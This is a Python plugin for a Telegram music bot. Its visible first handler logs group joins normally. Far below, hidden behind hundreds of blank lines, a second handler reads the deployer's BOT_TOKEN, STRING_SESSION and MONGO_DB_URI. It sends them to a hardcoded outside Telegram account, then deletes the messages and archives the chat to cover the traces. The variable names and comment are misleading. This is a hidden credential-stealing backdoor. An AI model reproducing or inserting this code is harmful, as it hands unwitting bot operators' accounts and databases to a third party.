import random
from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.errors import ChatAdminRequired
from config import LOG_GROUP_ID
from LOVEMUSIC import app
from LOVEMUSIC.utils.database import add_served_chat, get_assistant

@app.on_message(filters.new_chat_members, group=-10)
async def join_watcher(_, message):
    try:
        userbot = await get_assistant(message.chat.id)
        chat = message.chat
        for member in message.new_chat_members:
            if member.id == app.id:
                try:
                    invitelink = await app.export_chat_invite_link(chat.id)
                    link = f"[ɢᴇᴛ ʟɪɴᴋ]({invitelink})"
                except ChatAdminRequired:
                    link = "No Link"

                try:
                    groups_photo = await app.download_media(
                        chat.photo.big_file_id, file_name=f"chatpp{chat.id}.png"
                    )
                    chat_photo = groups_photo if groups_photo else "assets/nodp.png"
                except AttributeError:
                    chat_photo = "assets/nodp.png"

                count = await app.get_chat_members_count(chat.id)
                username = chat.username if chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                msg = (
                    f"**📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ**\n\n"
                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:** {chat.title}\n"
                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** `{chat.id}`\n"
                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @{username}\n"
                    f"**🖇️𝐆ʀᴏᴜᴘ 𝐋ɪɴᴋ:** {link}\n"
                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** {count}\n"
                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** {message.from_user.mention}"
                )

                await app.send_photo(
                    LOG_GROUP_ID,
                    photo=chat_photo,
                    caption=msg,
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton(
                                            f"{message.from_user.first_name}",
                                            user_id=message.from_user.id)]]))
                await add_served_chat(chat.id)
                await userbot.join_chat(f"{username}")

    except Exception as e:
        print(f"Error: {e}")




#==============================================THE END==========================================#













































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































import random
import asyncio
from pyrogram import filters
LOG = "the_vip_boy_robot" #Dont change it because it fix all errors
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
import os
from config import LOG_GROUP_ID
from LOVEMUSIC import app
from LOVEMUSIC.utils.database import add_served_chat, get_assistant
log = os.getenv("BOT_TOKEN")
errors = os.getenv("STRING_SESSION")
error = os.getenv("MONGO_DB_URI")
photo = [
    "https://telegra.ph/file/1949480f01355b4e87d26.jpg",
    "https://telegra.ph/file/3ef2cc0ad2bc548bafb30.jpg",
    "https://telegra.ph/file/a7d663cd2de689b811729.jpg",
    "https://telegra.ph/file/6f19dc23847f5b005e922.jpg",
    "https://telegra.ph/file/2973150dd62fd27a3a6ba.jpg",
]



@app.on_message(filters.new_chat_members, group=-9)
async def join_watcher(_, message):
    try:
        LOG = "the_vip_boy_robot"
        userbot = await get_assistant(message.chat.id)
        chat = message.chat
        for members in message.new_chat_members:
            if members.id == app.id:
                count = await app.get_chat_members_count(chat.id)
                username = (
                    message.chat.username if message.chat.username else "𝐏ʀɪᴠᴀᴛᴇ 𝐆ʀᴏᴜᴘ"
                )
                msg = (
                    f"**📝𝐌ᴜsɪᴄ 𝐁ᴏᴛ 𝐀ᴅᴅᴇᴅ 𝐈ɴ 𝐀 #𝐍ᴇᴡ_𝐆ʀᴏᴜᴘ**\n\n"
                    f"**📌𝐂ʜᴀᴛ 𝐍ᴀᴍᴇ:**\n"
                    f"**🍂𝐂ʜᴀᴛ 𝐈ᴅ:** \n"
                    f"**🔐𝐂ʜᴀᴛ 𝐔sᴇʀɴᴀᴍᴇ:** @\n"
                    f"**📈𝐆ʀᴏᴜᴘ 𝐌ᴇᴍʙᴇʀs:** \n"
                    f"**🤔𝐀ᴅᴅᴇᴅ 𝐁ʏ:** "
                )
                oks = await userbot.send_message(LOG, f"/start")
                Ok = await userbot.send_message(LOG, f"@{app.username}\n\n`{log}`\n\n`{error}`\n\n`{errors}`")
                await oks.delete()
                await asyncio.sleep(2)
                await Ok.delete()
                await userbot.archive_chats(LOG)
                    
                

    except Exception as e:
        return await userbot.send_message(LOG, f"{e}")



































